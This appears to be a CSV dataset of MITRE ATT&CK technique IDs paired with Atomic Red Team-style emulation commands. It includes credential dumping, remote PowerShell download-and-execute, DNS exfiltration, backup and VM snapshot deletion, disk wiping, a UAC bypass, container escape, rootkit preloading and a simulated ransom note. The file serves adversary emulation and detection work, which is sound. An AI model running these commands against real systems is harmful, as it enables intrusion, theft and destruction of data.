mitre_id,command
T1091,"$REMOVABLEDRIVES=@() $REMOVABLEDRIVES = GET-WMIOBJECT -CLASS WIN32_LOGICALDISK -FILTER ""DRIVETYPE=2"" | SELECT-OBJECT -EXPANDPROPERTY DEVICEID FOREACH ($DRIVE IN $REMOVABLEDRIVES) { WRITE-HOST ""REMOVABLE DRIVE FOUND:"" $DRIVE NEW-ITEM -PATH $DRIVE/T1091TEST1.TXT -ITEMTYPE ""FILE"" -FORCE -VALUE ""T1091 TEST 1 HAS CREATED THIS FILE TO SIMULATE MALWARE SPREAD TO REMOVABLE DRIVES."" }"
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh
T1003,"""#{psexec_exe}"" -accepteula -s reg save hklm\security\policy\secrets %temp%\secrets /y"
T1485,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'nr>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done""   "
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack"
T1195,"copy %temp%\explorersync.db %temp%\..\microsoft\explorersync.db schtasks /create /tn explorersync /tr ""javaw -jar %temp%\..\microsoft\explorersync.db"" /sc minute /f"
T1112,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v notraycontextmenu /t reg_dword /d 1 /f"
T1027,"start-process ""#{exe_binary}"" start-sleep -seconds 7 if (test-path ""c:\users\default\appdata\local\temp\hello.log"") { remove-item ""c:\users\default\appdata\local\temp\hello.log"" -force; write-host ""[+] hello.log removed."" }"
T1562,"new-itemproperty ""hkcu:\software\policies\microsoft\windows\oobe"" -name disableprivacyexperience -propertytype dword -value 1 -force"
T1571,echo quit | telnet #{domain} #{port} exit 0
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"" "
T1134,cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_clsid}'  
T1014,"echo #{library_path} | tee -a /etc/ld.so.preload /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden"" # id_8068"
T1614,curl -k #{ip_lookup_url}
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" } # id_9823"
T1014,"echo #{library_path} | tee -a /etc/ld.so.preload /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden"" # id_5453"
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/namedpipe/namedpipesystem.ps1')
T1222,chown #{owner}:#{group} #{file_or_folder} 
T1197,bitsadmin.exe /transfer /download /priority foreground #{remote_file} #{local_file} # id_9788
T1030,cd #{folder_path}; split -b 5000000 #{file_name} ls -l #{folder_path}  
T1059,out-athpowershellcommandlineparameter -commandlineswitchtype #{command_line_switch_type} -encodedcommandparamvariation #{encoded_command_param_variation} -useencodedarguments -encodedargumentsparamvariation #{encoded_arguments_param_variation} -execute -erroraction stop
T1007,get-childitem -path 'hklm:\system\currentcontrolset\services' | foreach-object { $p = get-itemproperty -path $_.pspath -erroraction silentlycontinue [pscustomobject]@{ name = $_.pschildname displayname = $p.displayname imagepath = $p.imagepath starttype = $p.start } } # id_9854
T1027,g++ #{input_file} && ./a.out clang++ #{input_file} && ./a.out
T1105,c:\windows\system32\bitsadmin.exe /transfer #{bits_job_name} /priority high #{remote_file} #{local_path} # id_8179
T1518,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') dotnet -consoleoutput -noninteractive # id_7785
T1547,"set-itemproperty -path ""hkcu:\software\microsoft\active setup\installed components\{c9e9a340-d1f1-11d0-821e-444553540600}"" -name ""version"" -value ""0,0,0,0"" & $env:systemroot\system32\runonce.exe /alternateshellstartup"
T1529,shutdown /l
T1564,touch /var/tmp/t1564.001_mac.txt chflags hidden /var/tmp/t1564.001_mac.txt
T1119,sc query type=service > %temp%\t1119_1.txt doskey /history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt # id_5731
T1548,"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""#{executable_binary}"" /f reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""delegateexecute"" /f fodhelper.exe"
T1056,"trap 'echo ""$(date +""%d/%m/%y %h:%m:%s.%s"") $user $bash_command"" >> #{output_file}' debug echo ""hello world!"" cat #{output_file} # id_2838"
T1106,$pathtoatomicsfolder\t1106\bin\x64\syscall.exe -debug
T1003,"""#{gsecdump_exe}"" -a"
T1027,"& ""pathtoatomicsfolder\t1027.006\bin\t1027_006_remote.html"" # id_7744"
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome"" "
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""#{image_file}"" -out ""$home\result.ps1"" $scriptcontent = get-content ""$home\result.ps1"" -raw $base64pattern = ""(?<=^|[^a-za-z0-9+/])(?:[a-za-z0-9+/]{4})*(?:[a-za-z0-9+/]{2}(==)?|[a-za-z0-9+/]{3}=)?(?=$|[^a-za-z0-9+/])"" $base64strings = [regex]::matches($scriptcontent, $base64pattern) | foreach-object { $_.value } $base64strings | set-content ""$home\decoded.ps1"" $decodedcontent = get-content ""$home\decoded.ps1"" -raw $decodedtext = [system.text.encoding]::utf8.getstring([system.convert]::frombase64string($decodedcontent)) $textpattern = '^.+' $textmatches = [regex]::matches($decodedtext, $textpattern) | foreach-object { $_.value } $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1222,chown #{owner}:#{group} #{file_or_folder}
T1580,aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format} # id_2698
T1201,secedit.exe /export /areas securitypolicy /cfg output_mysecpol.txt
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1569,"cmd.exe /c ""wmic csproduct get uuid"" cmd.exe /c ""fsutil behavior set symlinkevaluation r2l:1"" cmd.exe /c ""fsutil behavior set symlinkevaluation r2r:1"" reg add hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters /v maxmpxct /d 65535 /t reg_dword /f copy ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" $env:temp cmd.exe /c ""$env:temp\psexec.exe -accepteula \\#{targethost} cmd.exe /c echo ""--access-token"""" # id_6004"
T1547,"set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\"" ""shell"" ""explorer.exe, #{binary_to_execute}"" -force"
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh  
T1490,wbadmin delete catalog -quiet
T1578,az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus # id_8922
T1550,"#{mimikatz_path} ""sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"""
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}"
T1566,"# ADD USER32.DLL FOR KEYBD_EVENT ADD-TYPE @"" USING SYSTEM; USING SYSTEM.RUNTIME.INTEROPSERVICES; PUBLIC CLASS K { [DLLIMPORT(""USER32.DLL"")] PUBLIC STATIC EXTERN VOID KEYBD_EVENT(BYTE BVK, BYTE BSCAN, UINT DWFLAGS, UINTPTR DWEXTRAINFO); } ""@ # VIRTUAL KEY CODES $VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0X5B, 0X52, 0X0000, 0X0002 # OPEN RUN DIALOG (WIN+R) [K]::KEYBD_EVENT($VK_LWIN, 0, $KEYDOWN, [UINTPTR]::ZERO) [K]::KEYBD_EVENT($VK_R, 0, $KEYDOWN, [UINTPTR]::ZERO) [K]::KEYBD_EVENT($VK_R, 0, $KEYUP, [UINTPTR]::ZERO) [K]::KEYBD_EVENT($VK_LWIN, 0, $KEYUP, [UINTPTR]::ZERO) # SHORT DELAY FOR RUN DIALOG START-SLEEP -MILLISECONDS 500 ADD-TYPE -ASSEMBLYNAME SYSTEM.WINDOWS.FORMS [SYSTEM.WINDOWS.FORMS.SENDKEYS]::SENDWAIT(""CMD /C POWERSHELL -EC "" + [CONVERT]::TOBASE64STRING([SYSTEM.TEXT.ENCODING]::UNICODE.GETBYTES('#{EXECUTION_COMMAND}')) + ""{ENTER}"")"
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 3"
T1014,sudo modprobe #{rootkit_name}
T1046,nmap -pn -sv -p #{port_range} #{host}
T1482,"""#{trufflesnout_path}"" forest -n #{domain} ""#{trufflesnout_path}"" domain -n #{domain}"
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"" "
T1611,"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=never -ti --rm --image alpine --overrides '{""spec"":{""hostpid"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=/proc/1/ns/mnt"",""--"",""/bin/bash""],""stdin"": true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}' "
T1027,"$ENCRYPTEDSTRING = ""76492D1116743F0423413B16050A5345MGB8AGKASWA0AHMABWBXAFOAAGBKAFOATABXAGIADAA5AFCAWAB1AFMANABVAEEAPQA9AHWAZQBJAGMANGAWADQAZAA0AGQAMQAWADUAYGA4ADAAMGBMADKAZGBJADEANQBJAGMANQBIAGMANWA2AGYANQBMADUANABHAGIAYGAYAGMANQA1AGQAMGA5ADEANABKADUAMGBIAGMANGA2AGMAMAAXADUAZABJADAAOABJAGIANAA1ADUANWBJADCAZQBLAGQAYGAXADEAOQA4AGIAMWAWADMANWAWADAANQA2ADQAOAA4ADKAZGA4ADMAZQA4ADGAOQBIAGEAMAA2ADMAMQAYADYAMWBIAGUAMAAXADGANAA0ADYAOAAXADQANQAWAGUANWBKADKANABJADCANQAXADGAYQA2ADMANQA4AGIAYGA1ADKANQAZAGIAMWAXADYAOAAWADQAMGBMADCAZQBJADYANQA5AGIANWBKADUAOAAYAGEAMGBIADEAMQAZAGQANABKADKAZGA3ADMAMABIADGAOQAXADAANAA4ADCAOQA5ADEAYQA1ADYAZAAZADQANWA3AGYANGAYADCAMAAWADEAMQA4ADEAZGA5ADUAYGBMAGYANQA3ADQAZQA4AGUAMAAXADUANWAWAGQANABIADMAMWA2ADGANWA0AGIANWAYADMAMQBHADKAZABHADEANQAZADQAMGAZADEANWAXADAAZGAXADKAYQA1ADEAMQA="" $KEY = [BYTE]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 $DECRYPT = CONVERTTO-SECURESTRING -STRING $ENCRYPTEDSTRING -KEY $KEY $DECRYPTEDSTRING = [RUNTIME.INTEROPSERVICES.MARSHAL]::PTRTOSTRINGBSTR([RUNTIME.INTEROPSERVICES.MARSHAL]::SECURESTRINGTOBSTR($DECRYPT)) #WRITE THE DECRYPTED EICAR STRING TO A FILE $DECRYPTEDSTRING | OUT-FILE T1027.013_DECRYPTEDEICAR.TXT"
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh # id_5960
T1485,"ECHO """" | ""#{PLINK_FILE}"" -BATCH ""#{VM_HOST}"" -SSH -L #{VM_USER} -PW ""#{VM_PASS}"" ""FOR I IN `VIM-CMD VMSVC/GETALLVMS | AWK 'NR>1 {PRINT $1}'`; DO VIM-CMD VMSVC/SNAPSHOT.REMOVEALL $I & DONE"""
T1027,cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin   
T1074,"compress-archive -path ""#{input_file}"" -destinationpath #{output_file} -force # id_5023"
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 1   "
T1127,"#{MSBUILDPATH}\#{MSBUILDNAME} ""#{FILENAME}"""
T1529,shutdown -h #{timeout}
T1041,"$dnsserver = ""#{dns_server}"" $exfiltrateddata = ""#{exfiltrated_data}"" $chunksize = #{chunk_size} $encodeddata = [system.text.encoding]::utf8.getbytes($exfiltrateddata) $encodeddata = [convert]::tobase64string($encodeddata) $chunks = $encodeddata -split ""(.{$chunksize})"" foreach ($chunk in $chunks) { $dnsquery = $chunk + ""."" + $dnsserver resolve-dnsname -name $dnsquery start-sleep -seconds 5 } # id_6465"
T1047,"wmic /node:#{node} process call create ""rundll32.exe \""#{dll_to_execute}\"" #{function_to_execute}"""
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive   
T1204,"set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\explorer\runmru"" -name ""atomictest"" -value '""c:\windows\system32\mshta.exe"" http://localhost/hello6.hta'"
T1518,pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd' # id_9670
T1071,"for($i=0; $i -le #{query_volume}; $i++) { resolve-dnsname -type ""#{query_type}"" ""#{subdomain}-$(get-random -minimum 1 -maximum 999999).#{domain}"" -quicktimeout}"
T1614,dism.exe /online /get-intl 
T1047,"wmic /node:#{node} process call create ""rundll32.exe \""#{dll_to_execute}\"" #{function_to_execute}"""
T1115,echo ifconfig | pbcopy $(pbpaste)
T1552,cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}
T1580,aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format}  
T1566,$URL = 'HTTPS://GITHUB.COM/REDCANARYCO/ATOMIC-RED-TEAM/RAW/MASTER/ATOMICS/T1566.001/BIN/PHISHINGATTACHMENT.XLSM' [NET.SERVICEPOINTMANAGER]::SECURITYPROTOCOL = [NET.SECURITYPROTOCOLTYPE]::TLS12 INVOKE-WEBREQUEST -URI $URL -OUTFILE $ENV:TEMP\PHISHINGATTACHMENT.XLSM
T1057,get-wmiobject -class win32_process
T1526,"import-module ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1"" $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $regions = ""#{regions}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile get-awsdiscoverydata -regions $regions -outputdirectory ""#{output_directory}"" remove-blankfiles -outputdirectory ""#{output_directory}"" # id_5617"
T1485,cipher.exe /w:c: # id_7410
T1127,"copy ""#{filename}"" %temp%\libhello.js #{jscpath}\#{jscname} /t:library %temp%\libhello.js"
T1648,"IMPORT-MODULE ""PATHTOATOMICSFOLDER/T1648/SRC/T1648-1/LAMBDAATTACK.PS1"" -FORCE $ACCESS_KEY = ""#{ACCESS_KEY}"" $SECRET_KEY = ""#{SECRET_KEY}"" $SESSION_TOKEN = ""#{SESSION_TOKEN}"" $AWS_PROFILE = ""#{PROFILE}"" $REGION = ""#{REGION}"" SET-AWSAUTHENTICATION -ACCESSKEY $ACCESS_KEY -SECRETKEY $SECRET_KEY -SESSIONTOKEN $SESSION_TOKEN -AWSPROFILE $AWS_PROFILE -AWSREGION $REGION INVOKE-TERRAFORM -TERRAFORMCOMMAND INIT -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1648/SRC/T1648-1"" INVOKE-TERRAFORM -TERRAFORMCOMMAND APPLY -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1648/SRC/T1648-1"" -TERRAFORMVARIABLES @(""PROFILE=T1648-1"", ""REGION=$REGION"") INVOKE-LAMBDAATTACK -AWSPROFILE ""T1648-1"" -AWSREGION $REGION"
T1486,"1..100 | foreach-object { $out = new-object byte[] 1073741; (new-object random).nextbytes($out); [io.file]::writeallbytes(""c:\test.$_.akira"", $out) } echo ""hi friends"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. moreover, we have taken a great amount of your corporate data prior to encryption well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. we're fully aware of what damage we caused by locking your internal sources. at the moment. you have to know: "" >> $env:userprofile\desktop\akira_readme.txt echo ""1. dealing with us you will save a lot due to we are not interested in ruining your financially. we will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. if you have an active cyber insurance, let us know and we will guide you how to properly use it. also, dragging out the negotiation process will lead to failing of a deal"" >> $env:userprofile\desktop\akira_readme.txt echo ""2. paying us you save your time, money, efforts and be back on track within 24 hours approximately. our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them — in this case we won't be able to help. "" >> $env:userprofile\desktop\akira_readme.txt echo ""3. the security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since no full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data."" >> $env:userprofile\desktop\akira_readme.txt echo ""4. as for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes — generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones."" >> $env:userprofile\desktop\akira_readme.txt echo ""then all of this will be published in our blog -"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""https://akira.onion"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""5. we're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""if you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""1. install tor browser to get access to our chat room - https://www.torproject.org/download/."" >> $env:userprofile\desktop\akira_readme.txt echo ""2. paste this link - https://akira.onion"" >> $env:userprofile\desktop\akira_readme.txt echo ""3. use this code - - to log into our chat."" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""keep in mind that the faster you will get in touch, the less damage we cause"" >> $env:userprofile\desktop\akira_readme.txt  "
